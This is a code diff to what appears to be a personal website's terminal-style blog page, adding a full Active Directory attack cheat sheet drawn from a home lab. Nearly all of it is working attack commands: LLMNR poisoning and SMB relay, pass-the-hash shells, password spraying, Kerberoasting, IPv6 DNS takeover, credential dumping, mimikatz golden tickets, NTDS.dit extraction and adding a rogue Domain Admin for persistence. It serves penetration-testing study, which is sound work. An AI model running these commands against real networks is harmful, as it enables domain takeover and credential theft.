@@ -471,26 +471,158 @@
 					{
 						title: "Active Directory Exploitation Guide",
 						date: "2026-06-20",
-						preview: `A comprehensive reference for AD red team operations covering:
-- LLMNR poisoning & SMB relay attacks
-- Password enumeration & spraying
-- Kerberoasting & Golden tickets
-- Post-compromise techniques
-- IPv6 DNS takeover attacks
-- Security control evasion
+						content: `
+LAB ENVIRONMENT
+2HYDRA-DC         10.0.2.250
+punisher          10.0.2.220
+spiderman         10.0.2.221
 
-Read full post at: connordedic.dev/blog`
+INTERNAL ATTACK METHODOLOGY
+1. Start with mitm6 and responder
+2. Scan to generate traffic
+3. Check websites and look for alternate paths
+4. Look for default creds / low hanging fruit
+5. Enumerate further based on findings
+
+Note: Use responder on Linux, Inveigh on Windows
+
+LLMNR POISONING
+LLMNR poisoning works because machines in AD request
+access to named services that don't exist. When the
+connection fails, the attacker requests user:hash
+credentials. Target sends hash for offline cracking.
+
+Command: sudo responder -I <adapter> -dPv
+
+HASHCAT ATTACK MODES
+- Wordlist: hashcat -a 0 -m 400 hash.txt dict.txt
+- Wordlist+Rules: hashcat -a 0 -m 0 hash.txt dict.txt -r rules/best64.rule
+- Brute-Force: hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a
+- Combinator: hashcat -a 1 -m 0 hash.txt dict1.txt dict2.txt
+
+SMB RELAY (PASS-THE-HASH)
+Use responder to catch and relay hashes for control.
+
+Detect vulnerable targets:
+nmap --script=smb2-security-mode.nse -p 445 <target>
+
+Look for: Message signing enabled but not required
+
+Setup relay:
+sudo ntlmrelayx.py -tf targets.txt -smb2support
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i
+
+Connect with: nc 127.0.0.1 11000
+
+SHELL ACCESS
+Once you have password or hash:
+
+PSExec:
+impacket-psexec <domain>/<user>:'<pass>'@<DC-IP>
+
+PSExec with hash:
+impacket-psexec <user>@<DC-IP> -hashes <LM>:<NT>
+
+INVEIGH (Windows Alternative)
+Import-Module .\\Inveigh.ps1
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+PASSWORD ATTACKS
+WARNING: Max 5 attempts to avoid lockouts!
+
+Enumeration tools:
+- crackmapexec smb <DC-IP> -u <user> -p <pass> --pass-pol
+- rpcclient -U "" -N <DC-IP>
+- enum4linux -P <DC-IP>
+- enum4linux-ng -P <DC-IP> -oA <output>
+
+KERBRUTE (User Enumeration)
+kerbrute userenum -d <Domain> --dc 172.16.5.5 users.txt
+
+PASSWORD SPRAYING (Linux)
+for u in $(cat users.txt); do
+  rpcclient -U "$u%Pass123" -c "getusername;quit" <DC> | grep Authority
+done
+
+crackmapexec smb <DC-IP> -u users.txt -p Password123 | grep +
+
+WINDOWS SECURITY CONTROLS
+- Get-MpComputerStatus (Defender)
+- Get-AppLockerPolicy (App whitelist)
+- $ExecutionContext.SessionState.LanguageMode (CLM)
+
+LAPS PASSWORD SOLUTION
+Find-LAPSDelegatedGroups
+Find-AdmPwdExtendedRights
+Get-LAPSComputers
+
+CREDENTIALED ENUMERATION
+crackmapexec smb <DC-IP> -u <user> -p <pass> --users --groups
+smbmap -u <user> -p <pass> -d <domain> -H <DC-IP>
+rpcclient -U "" -N <DC-IP> enumerate
+windapsearch.py --dc-ip <DC-IP> -u <user>@<domain> -p <pass> --da
+
+KERBEROASTING
+Grab SPN hashes:
+impacket-GetUserSPNs <DOMAIN/user:pass> -dc-ip <ip> -request
+
+Crack: hashcat -m 13100 hashes.txt wordlist.txt
+
+Fix clock skew: sudo ntpdate -du <DC IP>
+
+TOKEN IMPERSONATION
+meterpreter > use incognito
+meterpreter > list_tokens -u
+meterpreter > impersonate_token DOMAIN\\Administrator
+
+IPv6 DNS TAKEOVER
+sudo mitm6 -d <domain>
+impacket-ntlmrelayx -6 -t ldaps://<DC-IPv4> \\
+  -wh <fakeservice>.<domain>.local -l <loot>
+
+Extract secrets: impacket-secretsdump <DOMAIN/USER:PASS>@<DC>
+
+GOLDEN TICKET
+You need: SID and krbtgt hash
+
+privilege::debug
+lsadump::lsa /inject /name:krbtgt
+kerberos::golden /User:<User> /domain:<domain> \\
+  /sid:<SID> /krbtgt:<krbtgt> /id:500 /ptt
+
+misc::cmd (open shell in mimikatz)
+
+POST-DOMAIN COMPROMISE
+1. Total control achieved
+2. Provide additional value
+3. Add persistence
+
+Create user:
+net user /add <user> <pass> /domain
+net group "Domain Admins" <user> /ADD /DOMAIN
+
+NTDS.dit EXTRACTION
+Run on DC: impacket-secretsdump LOCAL -system \\
+  registry_SYSTEM -ntds registry_NTDS.dit
+
+Crack: hashcat -m 1000 hashes.txt wordlist.txt
+
+EXPLOIT CHECKLIST
+- ZeroLogon (CVE-2020-1472): Scanner only, don't run
+- PrintNightmare (CVE-2021-1675): Scan only
+- Always document findings thoroughly`
 					}
 				];
 
 				const post = posts[index];
+				const lines = post.content.trim().split("\n");
 				const content = [
 					"",
 					"    ╔══════════════════════════════╗",
 					`    ║ ${post.title.substring(0, 28).padEnd(28)} ║`,
 					"    ╚══════════════════════════════╝",
 					"",
-					...post.preview.split("\n"),
+					...lines,
 					"",
 					"  [ 0 ] back to message board",
 					"",
